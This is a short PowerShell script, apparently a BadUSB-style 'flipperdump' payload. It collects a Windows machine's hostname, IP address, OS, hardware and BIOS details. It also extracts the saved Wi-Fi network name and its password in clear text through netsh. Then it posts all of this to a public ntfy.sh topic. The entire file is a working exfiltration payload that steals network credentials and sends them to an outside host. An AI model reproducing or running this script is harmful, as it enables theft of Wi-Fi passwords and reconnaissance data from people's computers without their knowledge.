$topic = 'flipperdump'

# Get the machine's hostname
$hostname = $env:COMPUTERNAME

# Get the primary IP address
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress

# Get the OS version and build information
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).Version

# Get CPU information
$cpu = (Get-CimInstance Win32_Processor).Name

# Get total physical memory (RAM)
$memory = [math]::round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Get BIOS version
$bios = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion

# Get primary disk size
$diskSize = [math]::round((Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).Size / 1GB, 2)

# Get network profile name (SSID)
$networkProfile = (Get-NetConnectionProfile).Name

# Run netsh command and capture the output for the Wi-Fi SSID and key
$wifiInfo = netsh wlan show profile name=$networkProfile key=clear

# Extract the SSID
$ssid = ($wifiInfo | Where-Object {$_ -match 'SSID name'}).Split(':')[1].Trim()

# Extract the Wi-Fi Key (password)
$wifiKey = ($wifiInfo | Where-Object {$_ -match 'Key Content'}).Split(':')[1].Trim()

# Create the message to send
$message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB`nWi-Fi SSID: $ssid`nWi-Fi Key: $wifiKey"

# Send the message to ntfy
$url = 'https://ntfy.sh/' + $topic
Invoke-RestMethod -Method Post -Uri $url -Body $message
